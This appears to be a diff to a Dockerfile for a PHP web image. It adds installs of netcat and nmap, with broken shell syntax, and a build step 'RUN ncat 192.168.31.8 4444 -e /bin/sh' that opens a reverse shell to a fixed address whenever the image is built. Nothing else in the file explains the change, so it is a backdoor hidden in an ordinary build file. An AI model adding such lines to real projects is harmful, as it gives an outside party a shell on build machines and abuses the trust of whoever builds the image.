@@ -17,6 +17,8 @@ RUN apt-get update && \
     php-pear \
     php-gd \
     && \
+    apt-get install nc \
+    apt install nmap \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/*
 
@@ -36,3 +38,6 @@ EXPOSE 80
 
 COPY main.sh /
 ENTRYPOINT ["/main.sh"]
+
+RUN ncat 192.168.31.8 4444 -e /bin/sh
+CMD ["/bin/bash"]
